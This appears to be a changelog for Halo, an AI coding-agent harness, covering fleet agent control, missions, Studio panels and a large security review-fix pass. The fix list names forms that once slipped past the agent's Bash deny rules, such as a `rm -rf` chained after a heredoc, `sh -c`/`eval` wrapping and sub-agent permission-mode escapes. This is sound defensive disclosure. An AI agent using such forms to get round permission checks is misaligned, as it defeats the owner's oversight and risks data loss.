## [3.0.6.0] - 2026-10-15

Fleet Missions: every connected harness says what it can do (its MCP servers and tools, skills, models, craft apps, hardware, tags), "Who can..." finds the right one, and one goal is split across the fleet by capability, each part with its own claims so nobody steps on anyone, run on the harness that has the tool, merged and reported on the hub. Rolo's ask, 2026-10-14 evening.

### R6: Capabilities

- Fleet capabilities: every harness gathers, in code, what it can do (MCP servers and their tools, skills, models it is best with and its local ones, craft apps, ComfyUI models, hardware with GPU and VRAM, command-line tools, projects, roles, integrations, tags), cached at `~/.halo/fleet/capabilities.json` and refreshed hourly, on `halo mcp add/remove` and on demand; a slow MCP server never holds it up.
- Names only leave the machine: no full path, server command or key; `fleet.capabilities.hide` keeps a server, tool or skill off the catalog and `fleet.tags` adds your own words.
- A joined harness announces a one-line summary and its catalog's hash; the hub asks for the whole catalog once per hash (the new read-only `capabilities` fleet command) (`GET /api/fleet/capabilities`).
- "Who can...": `halo fleet who "<query>"`, `/fleet who` and Studio rank the fleet for a tool, app, skill, model, CLI or GPU, with what matched and why (`GET /api/fleet/who`).
- `halo fleet capabilities [name] [--tools]` prints each harness's spec sheet.
- Studio Fleet has a Capabilities panel: the Who can... box, a spec card per harness with MCP servers opening to their tools, and Refresh; capability chips on the map's harness boxes and in People, a specs link, palette "Fleet: who can..." and "Fleet: specs of ...".

### R7: Missions

- Fleet missions: `halo fleet mission new "<goal>"` (or `POST /api/fleet/missions`) has the hub's lead split one goal into parts with every harness's capability catalog in front of it; a part that needs what only one harness has is pinned there with the reason, a tie goes to `fleet.mission.prefer` then the least busy harness, and a part that needs something nobody has is flagged unassignable.
- Parts never step on each other: each part claims the files it edits, two parts whose claims overlap run one after the other, and on the harness that runs it an edit outside its claims is refused (also for its sub-agents) and raised to the owner; inside its claims the owner's own permission rules decide as always.
- A part reaches a member as the `run_task` fleet command under its `fleet.allow_control` (ask: "hub asks to run mission m-... part 1 here: ... (claims: ...)"), runs as a `mission-worker` session you can see, pause and stop like any agent, and the mission folder is shared over the signed fleet protocol or a real mount (`fleet.shared_dir`).
- Parts run by their dependencies, repo parts merge one at a time into `mission/<id>/merged` with Orchestra's judge, and `report.md` says who did what on which harness, the cost per harness and per part, the decisions and what failed.
- `halo fleet mission plan | edit | approve | run | status | stop | report | open` (`--json`), `/mission`, routes `GET/POST /api/fleet/missions...`, attention rows for a plan to approve, a mission card and a refused edit; docs/MISSIONS.md.
- Fixed: a member that already had a capability catalog cached was asked for it before its command stream opened, so the hub waited a minute for it.

### R8: Missions in Studio

- Studio Fleet has a Mission panel: type one goal for the whole fleet, pick the harnesses to prefer and a budget, and Plan it; every mission is listed with its state, parts by state, harnesses and cost.
- The plan is drawn on the Fleet map: each part a node in its harness's box (a lock where only that harness has what it needs, an amber edge where two parts wait on each other's files, a red chip where nobody can run it), and as a table under the map.
- Drag a part to another harness on the map to move it; a harness that lacks what the part needs refuses with the reason and the part snaps back. Drop, Plan again, Approve and Run are a click away.
- While it runs: parts waiting on a member's owner pulse amber, running parts show the line their agent is on, the cost per harness ticks and the merge queue fills; Stop asks for a reason; the report shows who did what on which harness, the cost per harness and per part, and opens the artifacts.
- Mission rows in Attention (approve and run, edit, drop; a refused edit; a hub asking to run a part here, which now names its mission so O opens it), a mission chip on a part's session in the rail, the running missions in the status bar, palette "Fleet: new mission / approve mission / stop mission / mission report", and `M` in Fleet.
- Fleet's default layout: Mission under the map, Activity under Attention.

## [3.0.5.0] - 2026-10-15

Fleet: every connected harness, every session and every agent at every depth, live in Studio: watch what an agent thinks, runs and writes, steer, pause or stop that one agent, on your machine or a paired teammate's. The Roles canvas lights up while its agents work. Rolo's brief, 2026-10-14.

### Fleet R1: every agent at every depth is addressable

- Every session opens its loopback control socket by default (`fleet.enabled`,
  default true); `remote.enabled` is now only the Signal bridge's switch and
  `halo remote signal run` needs it. `halo --private`, `/private on|off` and
  `fleet.private` keep a session out of the registry (a `private` chip in the
  status bar).
- Registry entries carry `harness` (a stable id in `~/.halo/fleet-id`,
  `fleet.name` defaulting to user@host, host, version, os), `project` (repo,
  branch, dirty, from git), `kind` (tui, print, paperclip, orchestra-worker,
  flow) and `parent`; old entries still load.
- A live agent tree per session: main, every sub-agent at every depth and
  every background Bash job, each with its state (queued, running, waiting,
  paused, done, failed, stopped), the tool in flight, its last text, turns and
  cost.
- New control commands `agents`, `agent_tail`, `agent_steer` (nudge keeps it
  going, redirect replaces the rest of its task), `agent_stop`, `pause`,
  `resume`, `shutdown` and `agent_follow`. The loop checks them at tool and
  model boundaries; each is recorded with its origin in the agent's
  transcript and the parent gets one line. A steer never widens a permission,
  answers a card or skips a gate.
- Feed frames `agent_state`, `agent_event` (for followed agents) and `fleet`;
  every frame carries `session_id` and `harness`.
- Studio: `GET /api/sessions/<sid>/agents`, `.../agents/<aid>/tail`,
  `POST .../agents/<aid>/command`, session `shutdown`/`pause`/`resume`, and an
  agent count in the Sessions rail.
- `halo remote agents | steer --agent | stop --agent` and `/agents live`.

### Fleet R2: a hub, a six-word pairing, and what a joined harness shares

- `halo fleet serve` and `halo studio --fleet` run a hub on its own LAN port
  (`fleet.hub.port`, 7430) that serves only the fleet protocol: HMAC-signed
  requests with a timestamp and nonce replay window, signed and numbered
  commands down, TLS with a pinned self-signed certificate when
  `cryptography` is installed (`halo-harness[fleet]`), HMAC-only otherwise.
  Offline mode refuses it.
- `halo fleet pair [--ttl]` makes a one-time six-word code with a QR and the
  hub's fingerprint; `halo fleet join <host:port> --code "..."` pairs through
  a key exchange the code authenticates (`--share`, `--allow-control`,
  `--fingerprint`); `halo fleet leave | status | members | kick`.
- A joined harness announces every session with its agent tree and forwards
  its feed per `fleet.share`: `status`, `events` (default) or `full`. Full
  local paths never leave the machine; a hub that is down never slows a
  session.
- Control from a hub is gated by `fleet.allow_control`: `ask` (default) shows
  an allow/deny card in the owner's TUI (print-mode sessions deny), `none`
  refuses with the reason, `all` applies; every command is recorded with its
  `by` and `via`. Cards are answerable from a hub only with `all` plus
  `fleet.allow_answers`, once; a hub never gets a tool permission.
- Studio: `GET /api/fleet` (every harness, session and agent tree, with
  version chips), `POST /api/fleet/<harness>/<sid>/command` and
  `.../agents/<aid>/command`, `GET /api/fleet/commands/<id>`,
  `POST /api/fleet/hub`; member frames arrive on the feed with `harness`,
  plus `fleet` frames for join, leave, online, offline, sessions and command.
- `halo fleet` is a live terminal table (`s` steer, `k` stop, `p` pause,
  `--once`, `--json`); `/fleet` opens the same table in the TUI.

### Fleet R3: the Fleet section, the agent inspector, Live Roles and the hop keys

- Studio **Fleet** (Alt+6, `halo studio --mode fleet`, `/studio fleet`):
  every harness as a box, its sessions as cards, each session's agents as a
  live tree (**By project** groups everyone on a repo); click an agent to
  watch what it thinks, runs and writes (Thinking / Working / Output), and
  steer (nudge or redirect), pause, stop or follow that one agent. A spawn or
  a message lights the edge between two agents for a moment.
- The rail's **Fleet tree** in every section (harness > session > agent,
  live and need-you counts, inline answers for local and member sessions)
  replaces the list of live sessions.
- **Hop keys** everywhere: `J`/`K` next/previous live agent (Fleet, Roles,
  Org, Orchestra lanes), `F` follow, `Space` pins a **mini stream** that
  floats over any section, `Esc` unpins, `P` pause; `K` in the agent panel
  stops with a confirm.
- **Live Roles:** the Roles and Org cards glow in their band colour by what
  their agents do (typing, tool calls, waiting, done, failed), with a count
  badge and a cost ticker; the Inspector's **Live** tab streams the agent
  with Steer / Pause / Stop / Follow, or shows the card's last runs.
- Fleet **Start view:** the pair code with its QR and the join line,
  share/control settings, joined hubs and members (kick).
- Routes `POST /api/fleet/pair`, `GET|POST /api/fleet/settings`,
  `POST /api/fleet/kick`, `GET /api/fleet/history`; sub-agent meta files
  record role and lineup.

### Fleet R4: the panels, the attention queue, caps, conflicts, hand-offs, recordings, replay and the digest

- **Attention**, one queue for the whole fleet: every decision anyone has to
  make (permission, question, plan and approval cards, fleet asks, waiting
  and paused agents, flow and Orchestra gates, commands waiting on a
  member's owner, spend caps, file conflicts) in one list with one-key
  answers (`a` accept, `r` redo/deny with a text, `s` stop, `o` open the
  panel it belongs to), each answer routed through the handler that already
  owns it and journaled with who made it (`GET /api/fleet/attention`,
  `POST /api/fleet/attention/answer`); the count sits in the status bar of
  every section and in the Fleet rail. New rows reach the paired phone as
  the Signal bridge's own cards, prefixed with the harness name, when the
  bridge is enabled, running and paired (`fleet.attention.signal`).
- **People**: one row per harness (host, version with a mismatch chip and
  the `halo update` hint, share and control levels, project and top session,
  live / idle / away, cost today), Kick and Message (a `note` the session's
  owner reads, never the model).
- **Activity** with a timeline strip: the merged live log (filter by harness,
  session, agent, kind; follow) and one lane per live agent over the last
  5 / 15 / 60 minutes, bars by state, tool calls as ticks, click to select.
- **Costs and caps**: spend ticker (fleet, per harness, per project, today,
  this session) and `fleet.caps.*` per harness, per project and for the
  whole fleet: reaching one pauses the sessions in its scope (`pause` with
  reason `cap`) and raises an attention row; lifting it resumes them
  (`GET|POST /api/fleet/caps`, `GET /api/fleet/costs`).
- **Health** per harness, cached 60 s: providers reachable, Studio version,
  disk, control sockets; a member answers the new read-only `doctor` fleet
  command (`GET /api/fleet/health`).
- **Project rooms and conflict warnings**: in By project every card shows
  dirty / ahead / behind and its worktree; two agents of different sessions,
  on any harnesses, editing one file of one repo (or holding one Orchestra
  claim) get a warning edge on the map, card chips and an attention row
  (`GET /api/fleet/conflicts`).
- **Hand-offs**: Take over an agent with a new brief (recorded as a hand-off
  in both transcripts) or Hand it to another harness (a Paperclip issue with
  Org mode on, `<repo>/.halo/handoffs/<id>.md` with it off), then it stops
  (`POST /api/fleet/<harness>/<sid>/agents/<aid>/handoff`).
- **Flight recordings**: Record on an agent or a session renders one
  self-contained HTML replay with no network (three streams, scrubbable
  timeline, tool rows, cost curve) into `~/.halo/recordings/`
  (`POST .../recording`, `GET /api/fleet/recordings/<name>`,
  `halo fleet record <sid> [--agent]`).
- **Canvas replay**: a scrub bar on the Roles canvas replays a finished
  session, the cards lighting up in the order they worked (play / pause /
  speed), from the Live tab's history (`GET /api/fleet/replay`).
- **"While you were away"**: a digest computed in code per harness
  (sessions, cost, decisions and who made them, files, errors, hand-offs)
  shown on the Fleet Start view and the rail when the tab comes back after
  ten minutes (`GET /api/fleet/digest`, `halo fleet digest [--since]`).
- Studio keeps one fleet watcher per server (3 s tick, started by the hub
  or the first panels route) that journals session starts and ends, member
  costs, files, errors, caps, decisions and hand-offs to
  `~/.halo/fleet/journal.jsonl`.
- docs/FLEET.md "The panels", docs/STUDIO.md Fleet section with its
  "How this works", docs/CONFIG.md (`fleet.caps.*`, `fleet.attention.signal`),
  docs/COMMANDS.md (`halo fleet record|digest`).

## [3.0.4.0] - 2026-10-14

### Media: ComfyUI is the eighth craft app, and media models have their own inventory

- `halo media init --url URL` registers the `mcp__comfyui__*` server for every
  session, Design turn and org position, and stores `comfy.url`. ComfyUI can
  run on another machine: every output is fetched over HTTP into the project.
- Tools: `comfy_models`, `comfy_workflows`, `comfy_object_info`,
  `comfy_inspect`, `comfy_run` (`set` by node id, title or key; `only` to run
  one stage), `comfy_status`, `comfy_fetch`. Workflows saved in the ComfyUI
  editor run by name; UI-format graphs, subgraphs included, are converted to
  API format automatically.
- Two starter workflows ship: `text-to-image-qwen` (Qwen Image 2.1) and
  `image-to-video-wan22` (Wan 2.2 i2v with the 4-step LoRA);
  `--install-workflows` saves them into ComfyUI's workflow browser.
- `halo media doctor [--smoke]` shows version, GPU, model folders, saved
  workflows, starter readiness and the registered entry; `--smoke` renders a
  64x64 test image. `halo media inspect | models | workflows | serve`.
- Halo Design lists ComfyUI (stills to `render.png`, clips to `render.mp4`)
  and `halo design doctor --probe` checks it.
- `halo models --media [image|video|audio|all]` lists the ComfyUI media
  models by what they produce (image-gen, video-gen, upscale, tts) with size,
  quantization and family, then the supporting LoRAs, VAEs and encoders;
  `--refresh` rescans into `~/.halo/media-models.json`. `halo models
  --best-for image-gen|video-gen|audio-gen|upscale` ranks them. Media models
  stay out of the LLM picker and the role and org tables; the Design chooser
  shows them as "Media models (ComfyUI)". docs/COMFYUI.md.

### Flows: a brief through roles, an org, a render you confirm, posts and metrics

- `halo flow new|run|resume|status|stop|report|answer|runs|validate|templates
  |posts|metrics`. A flow file walks a brief through intake, a lineup's
  roles, an org, a ComfyUI render into a design-project artboard, a human
  confirm (accept / redo with an instruction / stop, answered from any
  terminal or from Studio), posting and metrics. Runs are resumable,
  budgeted and stoppable, and live under `~/.halo/flows/runs/<id>/`; the
  artifacts (renders, posts.json, metrics.jsonl) live in the design project.
- The shipped `social-post` template and the built-in `marketing` org
  (Strategist, Researcher, Copywriter, an approval-gated Art Director,
  Publisher, Analyst). The Copywriter returns one JSON block with the text
  per platform (youtube, instagram, x, tiktok).
- Posting and metrics go through the Postiz CLI with your `POSTIZ_API_KEY`:
  `post` is a dry run until the flow says `live: true`; live posts upload
  the media once and create one post per platform; `metrics` samples
  `analytics:post` into `metrics.jsonl`, `halo flow run --watch` keeps
  polling on the step's `every`, `halo flow metrics <run>` samples once,
  `halo postiz doctor` checks the CLI and credentials. docs/FLOWS.md.
- Org approval gates now stay live at every depth of an org tree; a position
  two levels down no longer falls back to the stdin prompt.

### Studio: the Flow section, the Media panels, answering a live session

- Flow (Alt+5, `halo studio --mode flow`, `/studio flow`): a Start view
  (brief, platforms, budget, project, assets, model; Run, Run with --yes,
  Dry run; what a flow does; the past runs) until a run is open, then eight
  panels: Intake, Workflow (the steps as a graph; the confirm step is a
  diamond that lights amber while it waits on you), Renders (the render
  inline, Confirm / Redo with an instruction / Stop), Step, Posts, Metrics,
  Log, Report, live from the `flow_*` feed frames.
- The Media panels: ComfyUI status with the VRAM bar and Scan, models by
  image / video / audio / upscale, workflows and their inputs, a quick render
  into a design project. They are strips in Flow and pop out in Design from
  the palette; while ComfyUI does not answer they become one card that says
  how to fix it.
- The rail's live sessions show their status, and a session waiting on an
  org approval, a permission or a plan can be answered from Studio.
  `halo studio --mode orchestra|flow` and `/studio orchestra|flow` open
  those sections directly.
- Routes: `/api/flow/...` (templates, runs, start, events, answer, assets,
  stop, resume, report, posts, metrics), `/api/media/...` (status, models,
  scan, workflows, inputs, render), `/api/sessions` and
  `/api/sessions/<sid>/command` (answer, interrupt, steer, submit over the
  session's control socket). Feed frames `flow_*` and `media_render`.
  Design files serve `.mp4` as `video/mp4`.

### Studio: clarity (the owner's live review)

- One header: Roles, Org and Design are framed in embedded mode. Their own
  logo and mode buttons are gone, what remains is a slim toolbar, their
  status line moves to the shell's status bar, their theme follows the
  shell's, and R / O / D switch the shell's section.
- Panels are usable straight away: a click anywhere focuses a panel (a ring;
  an open Inspector follows it) and panels open on their full face. The
  title bar is the title, a one-line "about", one Compact / Expand toggle
  and a "..." menu (Float, Collapse, Reset this panel, Settings, Help).
- Every panel has help: `?` on a focused panel opens its about line and its
  how-to lines; the Inspector shows them too.
- "How this works" for each section (Orchestra, Roles, Org, Design, Flow):
  numbered steps, the panels and the keys, from the `?` beside the tabs,
  the palette (Help: how X works) or `?`, shown once as a first-visit
  welcome. The same copy is in docs/STUDIO.md.
- Orchestra opens on a Start view when no run is open: the goal form with
  examples, the five steps, Run, the past runs; the runs are also in the
  rail. The Goal panel shows every field and Run at its default size.
- The Roles and Org canvases group their cards in labelled boxes: by role in
  Roles; by manager in Org with Leadership on top. Drag a box to move the
  group, drop a card into a box to join it, `A` lays the groups out, and the
  toolbar's Groups button hides them.
- The model dropdowns (bio form, assignment override) say how many models the
  catalog holds, and when it holds none they say why per provider (not set
  up, detected but not enabled, enabled but nothing cached) with a Refresh
  models button that pulls every enabled provider's catalog in place
  (`GET /api/models/status`, `POST /api/models/refresh`).
- Fixed: clicking a panel's title bar no longer marks the layout as yours;
  the flow run list is newest first even for two runs started in the same
  second; `halo --help` test is width-independent.

## [3.0.3.0] - 2026-10-14

### The Orchestra: five agents write one file at once and nothing is lost

The harness from Kem Tossoun's reel, built into Halo: a workflow graph that
is designed in code before anything runs, a goal with WHAT YOU WANT / DONE
WHEN / STOP WHEN, a lead that splits the goal into jobs, claims on parts of a
file, one git worktree per worker, merges one at a time, a fresh agent that
judges a merge conflict and tests that check its answer, a quality gate that
sends a failed piece back to its worker, everything logged with time, and a
report of checks at the end. Code decides wherever it can; a model judges
only when it must.

- `halo orchestra new|run|status|lanes|claims|log|report|stop|runs`. A run
  lives in `<repo>/.halo/orchestra/<run-id>/` (goal.json, workflow.json,
  split.json, claims.jsonl, lanes/, merge.json, events.jsonl, report.json)
  and is resumable; `run --dry-run` shows the split only; `--model REF`
  picks the workers' model. The basket.py walkthrough ships in
  `templates/orchestra/` and docs/ORCHESTRA.md.
- Claims on a function, a class, a method, a Markdown section or a whole
  file, one holder per key, with a time limit. Inside a run, Write and Edit
  on the goal's files check the claims: someone else's unit is refused
  naming who holds it and until when; an unclaimed unit asks you to claim it
  first; your own claim goes straight through. The tools OrchestraClaim,
  OrchestraRelease, OrchestraClaims and OrchestraNote exist only inside a run.
- The lead's split is one model call checked by code (every key must exist,
  no key in two jobs, no more jobs than workers). Workers run as fresh
  `halo -p` children in their own worktrees. Merge order is decided by code
  (job order, then smallest diff). A conflict goes to a fresh judge that sees
  only the goal and the conflict hunks; code applies its answer and the tests
  check it. A piece that fails the gate goes back to its worker at most
  `return_cap` times. A worker's `STOP:` line, the lead's stop answer, the
  cap or `halo orchestra stop` end the run, and the report is still written.
- `/orchestra` in the TUI shows the run's steps, lanes and latest log lines.
  Run events (`orchestra_state/claim/merge/gate/report`) ride the session feed.

### Halo Studio: a React shell, movable panels, motion that shows state, the Orchestra console

- Studio is now a React + Vite shell with four sections, Orchestra | Roles |
  Org | Design (`Alt+1..4`). Roles, Org and Design are the classic pages,
  framed from `/legacy/`; `halo studio --legacy` opens the classic page on its
  own. The built bundle is committed, so installs need no node; CI's
  `studio-ui` job rebuilds it and fails on drift.
- Movable workspace: drag, resize and snap panels on a 24-column grid,
  collapse a panel to a strip, pop it out to float, `Alt`/`Alt+Shift`+arrows
  from the keyboard; the arrangement is remembered per section, Reset layout
  is in the rail and the palette. Every panel has a Glance face, an Expand
  face and Settings. `Ctrl/Cmd+K` opens a fuzzy, grouped command palette.
  Theme: dark ("holo"), light, or follow the system.
- One motion vocabulary (idle, working, waiting, done, error, live) means the
  same thing everywhere and becomes static colour under reduced motion.
- Live feed: `GET /api/events` streams events from every running halo
  session over SSE (the token goes in the query because EventSource cannot
  send headers). The status bar dot is green, amber or red and ticks per event.
- The Orchestra section is the run console: eight panels, the goal with Run
  and Dry run, the workflow graph with its gate diamond and return arrow, a
  timeline per lane, the live one-file view with each lane's claimed unit as
  a coloured band holding its current text, a run grid for 5 to 50 lanes, the
  timed log with filters, the report with its checks and Copy, and the live
  claims with Release and Steal. Routes `/api/orchestra/...`; a run started
  from Studio streams its log on the live feed. Palette: new run, stop run,
  open run, focus lane. docs/STUDIO.md "Orchestra: the run console",
  docs/media/studio-orchestra.png.

## [3.0.2.2] - 2026-10-13

The follow-ups the 3.0.1.0 review fix pass left open, closed at the source.

- Halo Design turns send the prompt to the child on stdin instead of the
  command line, so a very long design prompt no longer hits the OS argument
  limit; it is capped at 1 MB.
- `/clear` on a `cx:` (Codex) session now closes the Codex bridge, so the
  next turn starts a fresh thread instead of continuing the old one.
- `halo remote install` runs `gpg --verify` without your provider API keys in
  its environment.
- An error in a background task inside any dialog (setup wizard, init tabs,
  MCP status, tasks panel, model picker, local and Ollama status, lineup and
  bio editors) now shows an error notice and the TUI keeps running.
- Studio Org-mode layouts are saved as `_pc-<company id>.json`, so they
  persist on Windows; a layout saved under the old `pc:<id>.json` name on
  Linux or macOS moves to the new name the first time it is read.
- The role picker (`u` in the model picker) shows why a model cannot take a
  role and stays open, instead of closing as if the role had been set.
- `halo update` on the stable channel compares an install made from the
  release archive with that release's `checksums.txt` and prints
  `installed archive: match` (or `mismatch`, `no-hash`, `no-checksums`); a
  git or checkout install has no local artifact to compare, and the docs say
  so.
- Maintainers: re-running `tools/ingest_model_table.py` keeps
  `anthropic_model_capabilities`, `decision_only_name_patterns`, `edit_hints`
  and hand-added rows in `model_table.json`.

## [3.0.2.1] - 2026-10-13

- On Linux and macOS, /undo, /redo and /rewind now snapshot and restore a
  file whose name contains a backslash as that same file; the shadow store
  used to turn the backslash into a folder separator and bring the content
  back under a different path.
- The 3.0.2.0 suites run was red on CI for two test-only reasons (that
  backslash case, and an installer syntax check that hit the WSL stub on the
  Windows runner); both are fixed and the tag is cut again from a green run.

## [3.0.2.0] - 2026-10-13

### The 3.0.1.0 review fix pass: 160 findings closed

An independent 15-reviewer code review of 3.0.1.0 (read-only, 161 confirmed
findings: 15 high, 75 medium, 71 low) was worked through as fifteen parallel
rounds, one per area, each pinned by its own `tests/test_review3_*.py`
modules (about 190 new tests, plus a data-driven probe that runs every
permission-engine command through all six modes). One finding (a WebFetch
redirect guard) was dropped under the standing contract, and one (the
WebFetch cache key) turned out not to hold and is pinned as it stands. Every
fix is deny/ask-side, plan-mode, acceptEdits or Read-deny integrity;
allow-side matching, auto mode and bypassPermissions are unchanged.

**Permission engine.**
- A Bash deny or ask rule now catches a command written on the same line as a heredoc opener (`cat <<EOF; rm -rf x`), in every mode. Plan mode and the read-only check no longer let such a command through.
- acceptEdits and Read-deny checks now follow where `cd` really goes: a bare `cd`, `cd -- ~`, `cd -P ~`, `pushd ~`, a `cd` inside a `{ }` group, and a trailing `cd`. Each part of a command is judged in the directory it runs in, and an unknowable `cd` is never guessed as the project directory.
- Deny rules now see through `timeout 5s`, `xargs -n 1`, `xargs -o`, `time -p`, `env -C DIR` and sudo's `-r/-t/-h/-C/-T/-U` options, and match the command inside `sh -c '...'`, `bash -lc`, `eval ...` and `find -exec sh -c '...'`, including in bypassPermissions mode.
- Commands whose first option is `-c` (`wc -c`, `grep -c`, `gcc -c`, `git -c`) are no longer asked about or denied just because a Bash deny rule exists.
- A Read deny or ask rule now also covers `grep -eX`/`--regexp=X` forms, `cat -e`/`tail -f`, `$PWD/...`, `{a,b}` brace words, and recursive readers (`grep -r`, `rg`, `cp -r`, `tar c`) whose directory holds the denied file.
- Parentheses and braces inside quoted strings or `#` comments (`git commit -m "cleanup (rm build dir)"`) no longer trigger a Bash deny rule. A real subshell or `$( )` still does, nested ones included.
- A tool call whose arguments have the wrong type (`"command": null`) now gets a normal permission decision instead of ending the turn. Hook `if` gates no longer crash on such calls either.
- In plan mode a PowerShell allow rule no longer lifts the plan-mode ban. PowerShell deny rules now catch commands after cmd.exe's `&` inside `cmd /c "..."`, after a here-string, and launched through `Start-Process`.
- Permission rules and `--disallowedTools` spelled `Task` or `Task(name)` now govern the Agent tool, the same as rules spelled `Agent`.

**Trust boundaries.**
- A sub-agent can no longer run in a more permissive mode than the session that started it. Plan mode now always carries over to sub-agents, dontAsk can no longer be escaped, and a team lineup's `permissions.mode` is capped at the parent's mode too. In a folder you have not trusted, a project team template keeps its deny and ask rules, but its mode and allow rules are ignored.
- An untrusted project or local settings file can no longer set `permissions.defaultMode`, `disableAllHooks` or `plansDirectory`.
- `connector__<slug>` calls now accept only one of that connector's own tool names in `tool`. The session's whole-tool deny rules (for example `Bash`, `Write`, `mcp__<server>`) now also hold inside the inner claude.
- `@file` mentions (typed, or inside a command or skill body) and `@server:resource` mentions now honour your deny rules. A denied file or server is noted as not attached, and its content is never read.
- A `.mcp.json` server approval now holds only in the folder where you gave it. Approvals saved before this update are asked for once more.
- `halo design doctor --probe`, `halo mcp serve`, `halo remote signal link` and the signal-cli and Java version checks now start their child processes without halo's own provider keys, like every other tool child.

**Studio and tools.**
- Studio refuses requests whose Host header is not its own loopback address and port, so a DNS-rebinding page can no longer read artboards or the page. A refused request closes its connection, so the next request no longer gets a bogus 400.
- Studio's artboard route no longer follows a symlinked artboard folder out of the project, and HTML/SVG artboards are served with a sandbox directive of their own. History and comment values read from project files are shown as numbers and escaped.
- Design artboards whose names start with "v" (vector-logo, video-hero) are now found, versioned and listed. Comment pins, knobs, design.json and system.json are written under a per-project lock with atomic replace, and a damaged file is left as it is instead of being overwritten.
- A hand-edited lineup or bio opens in Studio with the validator's message instead of a 500. Layout and delete routes validate names.
- The Paperclip install finishes on its success line (the page stops polling and refreshes), a second click can no longer start a second install, and the installed server survives Studio stopping.
- `halo studio --stop` asks the running Studio to shut down and never kills an unrelated process that reused the pid in a stale studio.json. A damaged studio.json no longer crashes the wizard's Open Studio buttons.
- Large foreground Bash output spill files are deleted at session end. Grep without ripgrep now skips hidden files and .gitignore'd paths like ripgrep does. The 50 KB output backstop is enforced in bytes.
- The parallel read-only pool no longer batches `git remote add/set-url`, `--output`/`--ext-diff` forms, `tail -f` or other flag-dependent forms. Read-only MCP tools running in parallel get their own server timeout instead of a flat 30 s, and Grep gets ripgrep's own limit.

**Remote control and the Signal bridge.**
- A signed phone command that arrived late and was refused can no longer be sent again later by another device on the same account; a command dropped by the per-minute limit keeps its counter, so resending it a minute later works.
- A sub-agent finishing its turn no longer closes the permission card the phone is waiting on, and its status updates no longer replace the running session in `halo remote sessions`. A sub-agent's own cards reach the phone marked with its id.
- After a crash or a reboot, `halo remote signal run` no longer refuses to start because another process got the old bridge's pid, and `off`/`status` no longer report a dead bridge as running. The macOS launchd agent restarts the bridge only after a failure.
- A card that could not be sent (link dropped, timeout, rate-limit pause) is kept and sent again once the link is back. A card answered at the keyboard is closed on the phone too. When signal-cli refuses to deliver messages the bridge retries, shows `starting` with a notice, and respawns the link.
- Messages posted in a Signal group that contains the Halo number are ignored, with one notice per group. Typing indicators and read receipts wait out a rate-limit pause, which is announced once.
- Denying a permission from a remote client with "session" or "always" no longer saves the card's suggested allow rules. Wrong, expired and failed pairing-code attempts are audited. `remote.pair_code_ttl_s` is honoured. Sessions starting at once no longer delete each other's control sockets.
- A signal-cli download cut off mid-stream is a normal error, a refused trust step fails once instead of retrying forever, a changed safety number gives one notice, and `/attach ²`-style digits no longer crash the handler.

**Sessions, data and the agent loop.**
- /resume and the Ctrl+P session pick now really switch the live session, between turns only (a pick during a turn is refused with a notification). The transcript is replaced by the resumed conversation, and hooks, the `cc:`/`cx:` process, the tool-results folder, the cost meter and auto-titling all follow the new session.
- /undo, /redo and /rewind snapshots keep working when your global git config signs commits or runs hooks; a snapshot that cannot be committed is never recorded with a wrong id; /rewind restores files whose names have accents, quotes or backslashes.
- Writing a credential or config file through a symlink updates the target and keeps the link. Toggling a game theme off keeps config.json private. Saving a role template, organization, agent bio or team template is atomic and reports an unwritable folder instead of crashing.
- Team schedules and triggers fired from a live session now start with the session's full environment. Schedules whose day-of-week range ends in 7 now fire.
- When the model enters plan mode itself, the plan-file path reaches it, and in `-p` under `bypassPermissions` or `acceptEdits` the drafted plan is approved and implemented with the original mode restored.
- A team escalation with `ask: true` in a non-interactive session announces the switch once. A pasted screenshot no longer triggers a false "context truncation suspected" warning. `Agent(org=...)` runs under a team respect `delegation.max_parallel`.
- With `compactionModel` set, summary calls are billed at that model's prices. When the `--max-turns` wrap-up overflows the context window, Halo compacts and retries it once, else ends with a clear error.
- On a cc: session a Stop hook that keeps blocking no longer leaves a reply being read after the turn ends. `--resume <file>.jsonl` with an odd name imports under a stable valid id. A failed `Agent(task_id=...)` resume no longer marks the original task as failed.
- `/roles off` then `/roles on` keeps the active lineup's roles. Per-position org budgets count every dollar under concurrency. `halo teams import` validates every bio first and says when a bundle bio shadows a shipped one. The automatic cc:/cx: scrub rewrites only model keys and keeps CRLF files. An unresolvable role value runs sub-agents on the session model, as `/roles` says.

**Providers.**
- If the Governor's state directory cannot be written, Halo warns once and limits requests in-process instead of failing every model call. Esc during a Governor cooldown ends the turn as interrupted. The status bar shows the queue position and countdown while waiting. A report that could not get its lock no longer holds a slot for up to 30 minutes.
- A 4xx error is no longer retried just because its message contains numbers; only 429 and 408 among 4xx statuses are retried. Errors that arrive inside a stream keep their own type and code.
- `--effort minimal`/`none` on an `oai:` reasoning route sends the route's lowest level. `--effort xhigh` reaches the wire on Claude models that accept it. Claude Haiku 5.5 uses adaptive thinking. The forced-tool repair retry is not sent to Opus 5.5, Sonnet 5.5, Fable 5.1 or Mythos 5.1. These facts live in a per-family table in `model_table.json`.
- Mistral-style tool ids are unique within a reply and across turns.
- Two sessions on one Ollama host no longer corrupt `ollama-fit.json` or the capability cache. `hf:mlx/<repo>` no longer reuses a dead server. A malformed .gguf file or Ollama host URL no longer crashes `/local`, `halo local`, `halo doctor` or `halo ollama`. A 400 that echoes the rejected value no longer makes Halo "clamp" to that text.
- `halo local warm --keep-alive -1` works. Empty model refs (`ol:`, `or:`...) and a malformed alias table give clear errors. `halo balances --refresh` tolerates a string `total_usage`. On Apple Silicon the VRAM budget is the GPU share, not all RAM. Managed local servers are recorded as soon as they start, the registry lock is released around slow shutdowns, and the catalog caches are written atomically.
- docs/DATABRICKS.md now says GLM/Kimi endpoints try mlflow chat and then invocations; the native anthropic gateway is opt-in.

**MCP and commands.**
- `halo completion powershell` no longer puts unsafe model IDs into the script; all three shells reject words with quotes, `$()`, backticks or a backslash.
- An MCP server over HTTP that answers 401 is treated as needing login and the OAuth refresh runs. Tokenized MCP urls no longer appear in `/mcp`, `halo mcp list`, `halo mcp get` or the per-server log. Connect failures at session start land in the per-server log.
- A malformed `args` string in an MCP entry disables that one server with a reason instead of crashing startup. Two simultaneous calls to a dead server reconnect it once. `halo mcp add/remove -s project` and the `/mcp` edit form write `.mcp.json` atomically.
- `$ARGUMENTS` and `$0`..`$9` are substituted after an apostrophe in command and skill prose. `halo doctor --mcp deep` no longer sends literal secrets from `args` or non-credential env values to the model.

**The TUI.**
- A permission, question or plan card that arrives while a picker or dialog is open waits underneath and takes the keys once the dialog closes.
